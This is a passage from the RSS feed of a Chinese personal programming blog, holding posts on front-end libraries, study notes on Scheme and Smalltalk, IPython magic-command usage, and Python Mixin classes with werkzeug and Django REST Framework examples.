&lt;li&gt;允许开发者使用Web技术开发桌面应用&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/rogerwang/node-webkit"&gt;github&lt;/a&gt;  用css写桌面程序&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/zcbenz/nw-sample-apps"&gt;demo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;TimelineJS&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;帮助你创建精美、可交互的时间轴&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/NUKnightLab/TimelineJS"&gt;github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://timeline.knightlab.com/"&gt;demo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;togetherjs&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;能为一个已经存在的网站增加实时协作特性，在线成员能看到对方的实时操作&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/mozilla/togetherjs"&gt;github&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://togetherjs.com/"&gt;demo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 24 Sep 2014 00:00:00 +0000</pubDate><guid>tag:,2014-09-24:front-interesting.html</guid><category>web</category></item><item><title>Scheme学习笔记</title><link>/learn-Scheme.html</link><description>&lt;p&gt;大学时读了不少函数式的资料，十分喜欢函数式的风格。&lt;br /&gt;
前段时间比较认真地学了一下Scheme。&lt;br /&gt;
尽管我们在实际项目中很少会用到Scheme，但学习Scheme有助于写出更高质量函数。就像学习Smalltalk有助于理解对象。&lt;br /&gt;
Scheme和Smalltalk是我见过最纯粹优美的两门语言。&lt;br /&gt;
说说学习Scheme中的一些心得体会：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;表达你的意图，而不是操作过程，这样有助于我们能站在更高的抽象层面上&lt;/li&gt;
&lt;li&gt;尽量不要副作用，函数主要目的是返回(return)一个值。这样可以保证函树能更容易被当作黑箱，就是说有更好的抽象性&lt;/li&gt;
&lt;li&gt;for-loops表达的是过程，map,reduce,filter(sorted,groupby)隐含循环，语义上却在表达意图&lt;/li&gt;
&lt;li&gt;表达出你的意图能提高代码可读性&lt;/li&gt;
&lt;li&gt;在自己的定义中调用自己的函数叫做递归函数. &lt;/li&gt;
&lt;li&gt;现实中很多任务是递归的，重复某个动作，符合条件退出。这是普适性很强的抽象模型&lt;/li&gt;
&lt;li&gt;以下内容有助于你理解递归：你可能需要去阅读你正在阅读的文献所引用的文献。进一步，你可能还需要去阅读文件所引用的其它文献。这样，文献调研就是一个递归的过程，你也可以重复这个调研过程直到满足了特定条件&lt;/li&gt;
&lt;li&gt;递归耗内存的原因是开销大的原因在于过程没有被计算。一直存在内存中。尾递归的本质是用某个内存空间来收集计算的结果，而不必一直存在内存中&lt;/li&gt;
&lt;li&gt;cons 负责把每个结果串起来。大脑的内存不很大，我们能应付的复杂度很有限。所以每次不要走太远，每次只处理当前一步，思考后续一致，用递归的方式思考。  使用抽象来描述，不要把所有过程加载到大脑&lt;/li&gt;
&lt;li&gt;命名递归变量很重要，表达出意图&lt;/li&gt;
&lt;li&gt;lambda表达式的参数仅在函数定义内部有效。let只是lambda的语法糖，因此二者无异。对于语义的表达有帮助的话，语法糖就是良好的&lt;/li&gt;
&lt;li&gt;lambda表达式用于定义函数，它为变量建立了一个作用域，变量的作用域被限定在了源码中定义其的那个括号里&lt;/li&gt;
&lt;li&gt;闭包能记住内部状态，因此可以用来模拟对象&lt;/li&gt;
&lt;li&gt;赋值改变了参数的值，具有破坏性，当万不得已时才使用赋值&lt;/li&gt;
&lt;li&gt;Scheme并没有定义块结构的语法，因此使用lambda表达式作为一个块&lt;/li&gt;
&lt;li&gt;高阶函数是一种以函数为参数的函数。它们都被用于映射（mapping）、过滤（filtering）、归档（folding）和排序（sorting）表。高阶函数提高了程序的模块性。使用一个高阶函数来实现排序可以使得我们使用不同的条件来排序，这就将排序条件和排序过程清楚地划分开来。很容易写函数来实现插拔。&lt;/li&gt;
&lt;li&gt;Scheme中代码即数据，因此你可以通过将函数当作参数传递轻松的定义自己的高阶函数。&lt;/li&gt;
&lt;li&gt;你可以通过“程序”来写程序&lt;/li&gt;
&lt;li&gt;lisp中所有东西都是数据  代码也是 虚虚实实 惰性求值变得容易 。&lt;/li&gt;
&lt;li&gt;字符是个比较关键的概念，代码本身只是文本而已。Lisp语言的最初目的就是符号处理，在Scheme语言中几乎所有的东西都可以看做是符号或做为符号列表来处理&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://deathking.github.io/yast-cn/"&gt;Scheme入门教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.cnblogs.com/heros/archive/2009/11/30/1614111.html"&gt;Scheme简明教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ibm.com/search/csass/search/?q=Scheme&amp;amp;sn=dw&amp;amp;lang=zh&amp;amp;cc=CN&amp;amp;en=utf&amp;amp;hpp=20&amp;amp;dws=cndw&amp;amp;lo=zh"&gt;ibm&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 03 Sep 2014 00:00:00 +0000</pubDate><guid>tag:,2014-09-03:learn-Scheme.html</guid></item><item><title>Smalltalk学习笔记</title><link>/learn-Smalltalk.html</link><description>&lt;ul&gt;
&lt;li&gt;所有一切都是物体（Everything is an Object）。这是Smalltalk中最重要的一条规则。&lt;/li&gt;
&lt;li&gt;一个变量没有与之关联的类型。变量仅仅指向物体&lt;/li&gt;
&lt;li&gt;a := 2的真正含义不是“将a的值设置为整数2”，而是“让变量a指向一个值为2的SmallInteger(小整数)物体”&lt;/li&gt;
&lt;li&gt;所有的计算都通过消息（message）来触发。你向某个物体发送消息，然后就会发生某些事情。&lt;/li&gt;
&lt;li&gt;(15 * 19) + (37 squared)可以理解为：向15发送消息 * ，参数为19；向37发送消息squared；最后向15*19的结果发送消息 + ，参数为37 squared的结果。&lt;/li&gt;
&lt;li&gt;Smalltalk中所有的表达式都是&amp;lt;接受消息的物体&amp;gt; &amp;lt;消息&amp;gt;&lt;/li&gt;
&lt;li&gt;消息激发方法。一个消息会对应什么方法是由接受消息的物体决定的。&lt;/li&gt;
&lt;li&gt;每条消息（to: do:, whileTrue:, +）都会激发方法，这些方法是Smalltalk中的代码单元，你可以认为方法就是你常用的编程语言中的函数或者过程。方法是计算发生的地方。。你不仅可以查看它们的控制结构和操作是如何实现的——而且还能改动它们！&lt;/li&gt;
&lt;li&gt;每一个物体都是某类事物的一个实例。&lt;/li&gt;
&lt;li&gt;由于该类（事物）中定义了此实例（物体）的行为，所以必须找到这个接受消息的物体所属于的类，然后通过类来指出应该如何解释收到的消息。这一点非常重要。  (代码的位置，高层和底层视角的切换 很微妙)&lt;/li&gt;
&lt;li&gt;类是定义方法（行为）的地方，决定了物体是否有某种能力（能执行某个动作），所有代码都能在类中找到,没有魔术&lt;/li&gt;
&lt;li&gt;Smalltalk中没有什么要记住的关键字（甚至没有if，你可以自己实现）！使用Smalltalk，就像用小积木，能让你搭建出你想要的任何东西。&lt;/li&gt;
&lt;li&gt;在Smalltalk语言中没有条件语句，取而代之的是一些发送给对象true或者false的消息，因此它们不属于语言部分，而属于Smalltalk的类库；也没有循环重复语句（C语言中的for, while），Smalltalk用向数字对象或块对象发送消息来实现重复执行。&lt;/li&gt;
&lt;li&gt;语言没有固定的语法，语法分析由类本身完成&lt;/li&gt;
&lt;li&gt;Smalltalk是一种使用“晚绑定（late-binding”的语言，让相同的消息在不同的数据上执行近似的功能成为多态。当你看到一个printString消息时，你实际上并不知道将会执行什么，直到你了解这个消息被发送给哪个物体后，才能清楚到底会执行什么内容&lt;/li&gt;
&lt;li&gt;从smalltalk这里学习对象，从lisp那里学习函数&lt;/li&gt;
&lt;li&gt;面向对象编程的精髓在于将行为绑定在数据上&lt;/li&gt;
&lt;li&gt;在结构化程序设计之中，我们将精力集中在行为（动词）上，然后弄清楚我们需要哪些数据（名词）才能执行。总而言之，我们将数据绑定在行为上。但在面向对象程序设计之中，我们将程序的中心用名词和数据表示，然后弄清楚我们要将哪些行为绑定在他们之上&lt;/li&gt;
&lt;li&gt;Smalltalk和Scheme都非常优美纯粹，一致性非常好，相比之下，主流工业语言有些大杂烩，不少由于妥协导致的不一致，以及难以理解&lt;/li&gt;
&lt;li&gt;严格遵照一个唯一标准机制的做法已经被证明具有惊人的威力&lt;/li&gt;
&lt;li&gt;学习纯粹的语言，能让你更容易搞懂核心概念，而不会被各种枝节分神，而这些概念是大多编程语言的核心&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://zh.wikipedia.org/wiki/Smalltalk"&gt;Smalltalk wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://developer.51cto.com/art/201109/291681.htm"&gt;Smalltalk为什么让我爱不释手&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.sina.com.cn/s/blog_7d553bb501013w7d.html"&gt;Smalltalk的基本规则&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 03 Sep 2014 00:00:00 +0000</pubDate><guid>tag:,2014-09-03:learn-Smalltalk.html</guid></item><item><title>ipython使用笔记</title><link>/learning-ipython.html</link><description>&lt;p&gt;"给我一个强大而又灵活的文本编辑器（vim），一个交互式shell（IPython）以及一个语言（Python），我就能撬动整个世界。"&lt;/p&gt;
&lt;p&gt;将IPython用熟了，可以轻松在试验、编码、测试间 "无缝折腾"。&lt;/p&gt;
&lt;p&gt;"?" 和 "??" 是 IPython 中最常用的命令。&lt;/p&gt;
&lt;h2&gt;和shell交互&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;在shell中使用python变量，加上$&lt;ul&gt;
&lt;li&gt;folder = 'data' , mkdir $folder &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;!command  ,执行shell命令&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;path = &amp;quot;/var/www&amp;quot;
!echo $path
&amp;gt; /var/www
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;目录/书签&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;%pwd: 显示当前工作目录。&lt;/li&gt;
&lt;li&gt;%cd: 切换工作目录。&lt;/li&gt;
&lt;li&gt;%bookmark: 工作目录书签。  (永久？)
cd 和 bookmark 配合起来用，非常方便。&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;%bookmark test #为当前目录定义书签
%bookmark www /var/www #为其他目录定义书签
%bookmark -l # 显示书签列表
%bookmark -d text #删除书签
cd -b www #使用书签跳转，可省略 -b
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;书签跟别名的区别在于，它们会被自动持久化(写到.ipython里？)&lt;/p&gt;
&lt;h2&gt;edit&lt;/h2&gt;
&lt;p&gt;edit xx 进入文本 退出后执行文本中代码 默认使用vim,这样就可以跟外部文件沟通啦&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;edit hello.py
run hello
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;给ipython edit指定编辑器&lt;/h3&gt;
&lt;p&gt;eg：（我的mac下）&lt;br /&gt;
export EDITOR="/usr/local/bin/vim” &lt;/p&gt;
&lt;h3&gt;使编辑生效&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;reload(hello)&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;历史&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;%history: 显示历史。&lt;/li&gt;
&lt;li&gt;%hist: %history 别名。&lt;/li&gt;
&lt;li&gt;%dhist: 显示工作目录历史。&lt;/li&gt;
&lt;li&gt;%clear: 清除历史数据。&lt;/li&gt;
&lt;li&gt;%save: 保存输入命令到文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以将多个范围的输入数据保存到文件中。通常用于将交互环境中写的测试代码保存成源码文件。&lt;/p&gt;
&lt;p&gt;%save -r test.txt 33-34 36&lt;br /&gt;
保存33-34(闭区间)以及36行到当前目录下test.txt文件里&lt;br /&gt;
参数 -a 添加到结尾&lt;/p&gt;
&lt;h3&gt;自动设置ipython环境&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;写好ipython_context.py&lt;/li&gt;
&lt;li&gt;run ipython_context.py ,相关语句被导入执行，在上下文中&lt;/li&gt;
&lt;li&gt;dir()查看上下文变量&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;执行&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;%bg: 使用独立线程在后台执行。&lt;/li&gt;
&lt;li&gt;%rep: 获取上一次命令的输出，或提取某个历史命令。&lt;/li&gt;
&lt;li&gt;%run: 用来执行一个脚本，并将相关对象导入交互环境上下文。使用起来类似于熟悉的python test.py&lt;ul&gt;
&lt;li&gt;run命令还可以附加选项，常用的有-t选项，这个会在脚本执行完后，打印出执行的cpu timings。如果指定了-t选项，后面可以跟一个-Nx，x代表一个数字。表示重复执行x次。&lt;/li&gt;
&lt;li&gt;还有一个-p选项，这个选项会开启python profiler，从而打印出详细的执行时间、函数调用等等信息供优化参考。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;%runlog: 执行记录文件中命令。这对于 "恢复现场" 是非常有帮助地。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;记录&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;%logstart: 启动记录器。&lt;/li&gt;
&lt;li&gt;%logon: 开始记录。&lt;/li&gt;
&lt;li&gt;%logoff: 暂停记录。&lt;/li&gt;
&lt;li&gt;%logstate: 查看记录状态。&lt;/li&gt;
&lt;li&gt;%logstop: 关闭记录器。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;首先需要用 %logstart 启动记录器，中间可以随时使用 %logon/%logoff 启动或暂停，末了别忘了关闭记录器，确保记录信息写到磁盘文件中。&lt;br /&gt;
%logstart 启动后会连同该命令之前的历史记录一起保存，因此要想有个干净起点的话，最好调用 %clear 清理现场&lt;/p&gt;
&lt;h2&gt;显示&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;%p: Python print 函数的缩写。&lt;/li&gt;
&lt;li&gt;%pfile: 查看对象所在源码文件。&lt;/li&gt;
&lt;li&gt;%pycat: 查看源代码文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;搜索&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;%psearch: 在当前上下文的命名空间中进行模糊搜索。&lt;/li&gt;
&lt;li&gt;%psearch -i t&lt;em&gt;.S&lt;/em&gt;   其中 参数 -i 忽略大小写&lt;/li&gt;
&lt;li&gt;输入 CTRL + R 搜索历史命令&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;测试&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;%prun: 使用 profile 获取代码执行的性能统计。&lt;/li&gt;
&lt;li&gt;%time: 获取代码执行时间。&lt;/li&gt;
&lt;li&gt;%timeit: 通过多次循环，获得最佳的执行时间评测。 这个命令用来测试一条命令执行的时间，一般而且，会重复100次运行这个命令，然后取出最好的3个结果取平均值。&lt;ul&gt;
&lt;li&gt;%timeit [x*x for x in range(100000)]  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;调试&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;%debug: 激活交互调试模式。&lt;/li&gt;
&lt;li&gt;%pdb: 激活 pdb 调试模式，在引发异常时自动切入 pdb 调试命令行。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;熟悉 pdb 是必须的，别老想着用 print，assert 也比那个强些。&lt;/p&gt;
&lt;h2&gt;宏 macro&lt;/h2&gt;
&lt;p&gt;宏允许用户为一段代码定义一个名字&lt;/p&gt;
&lt;h2&gt;配置&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;%autoindent: 自动缩进开关。&lt;/li&gt;
&lt;li&gt;%automagic: 打开时可省略 %magic 前的百分号。&lt;/li&gt;
&lt;li&gt;%colors: 彩色方案。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;第一次运行ipython时会自动生成配置目录 $HOME/.ipython&lt;/p&gt;
&lt;h2&gt;notebook&lt;/h2&gt;
&lt;p&gt;ipython notebook。一个基于web的ipython shell！&lt;/p&gt;
&lt;p&gt;notebook使用起来和ipython差不多，不过修改起来方便得多，并且可以建多个notebook，所以使用起来各种方便&lt;/p&gt;
&lt;h1&gt;其他&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;%reset: 重置 IPython，清理相关环境对象，但历史信息被保留。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;参考资料&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.kochiya.me/www/posts/Ipython!.html"&gt;Ipython!&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pyist.diandian.com/?tag=ipython"&gt;IPython Magic Functions&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 03 Sep 2014 00:00:00 +0000</pubDate><guid>tag:,2014-09-03:learning-ipython.html</guid><category>ipython</category></item><item><title>Mixin技术学习笔记</title><link>/learning-python-mixin.html</link><description>&lt;p&gt;折腾edX和Django Rest Framework的时候都看到Mixin的身影，决定弄清楚它。&lt;/p&gt;
&lt;h2&gt;解释&lt;/h2&gt;
&lt;p&gt;Mixin即mix in，就是混入的意思。在不改变原对象的情况下对其进行扩展. 在运行期间,动态改变类的基类或类的方法&lt;br /&gt;
利用Mixin我们还可以增加无数总特征，而无需对已有代码作太大改动。实现无痛扩展&lt;/p&gt;
&lt;p&gt;和&lt;code&gt;多重继承&lt;/code&gt;类似.&lt;/p&gt;
&lt;p&gt;但通常主类和 Mixin 类本身不是 is-a 的关系，混入 Mixin 类是为了添加某些（可选的）功能。自由地混入 Mixin 类就可以灵活地为被混入的类添加不同的功能。&lt;/p&gt;
&lt;p&gt;传统的「接口」概念中并不包含实现，而 Mixin 包含实现。Mixin 提供了（默认）实现&lt;/p&gt;
&lt;p&gt;wu：是为了额外获得方法？&lt;/p&gt;
&lt;p&gt;Mixin的好处是可以为主类添加任意多的Mixin来实现多态&lt;/p&gt;
&lt;h2&gt;QuickStart&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Fruit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
       &lt;span class="k"&gt;pass&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;GiftMixin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
       &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;is_gift_fruit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
              &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;NotGiftMixin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
       &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;is_gift_fruit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
              &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;PareMixin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
       &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;eat_method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
              &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Pare&amp;#39;&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;HuskMixin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
       &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;eat_method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
              &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Husk&amp;#39;&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Apple&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;GiftMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PareMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Fruit&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;span class="k"&gt;pass&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Orange&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;GiftMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HuskMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Fruit&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;span class="k"&gt;pass&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Pear&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;NotGiftMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PareMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Fruit&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;span class="k"&gt;pass&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Banana&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;NotGiftMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HuskMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Fruit&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;span class="k"&gt;pass&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这样水果就知道自己的种类和特性啦&lt;/p&gt;
&lt;h2&gt;何时用&lt;/h2&gt;
&lt;p&gt;There are two main situations where mixins are used:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;You want to provide a lot of optional features for a class.&lt;/li&gt;
&lt;li&gt;You want to use one particular feature in a lot of different classes.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;摘自&lt;a href="http://stackoverflow.com/questions/533631/what-is-a-mixin-and-why-are-they-useful"&gt;what-is-a-mixin-and-why-are-they-useful&lt;/a&gt;这篇回答，就是说当一个功能特性被很多个类用到时，或者一个类需要很多功能特性时&lt;/p&gt;
&lt;h2&gt;demo&lt;/h2&gt;
&lt;h3&gt;&lt;a href="http://werkzeug.pocoo.org/docs/0.9/wrappers/"&gt;werkzeug中Request / Response&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;答主随后举了&lt;a href="http://werkzeug.pocoo.org/docs/0.9/wrappers/"&gt;werkzeug中Request / Response&lt;/a&gt;的例子&lt;/p&gt;
&lt;p&gt;If I wanted to make a request object that supports accept headers, etags, authentication, and user agent support, I could do this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;werkzeug&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BaseRequest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AcceptMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ETagRequestMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;UserAgentMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AuthorizationMixin&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;BaseRequest&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AcceptMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ETagRequestMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;UserAgentMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;AuthorizationMixin&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;pass&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;&lt;a href="http://www.django-rest-framework.org/tutorial/3-class-based-views.html"&gt;django-rest-framework.org/tutorial/3&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;许多公共行为在REST framework's mixin类中都实现了.方便的组合与重用&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;snippets.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Snippet&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;snippets.serializers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;SnippetSerializer&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;rest_framework&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;mixins&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;rest_framework&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;generics&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;SnippetList&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mixins&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ListModelMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                   &lt;span class="n"&gt;mixins&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CreateModelMixin&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                   &lt;span class="n"&gt;generics&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;MultipleObjectAPIView&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;model&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Snippet&lt;/span&gt;
     &lt;span class="n"&gt;serializer_class&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SnippetSerializer&lt;/span&gt;

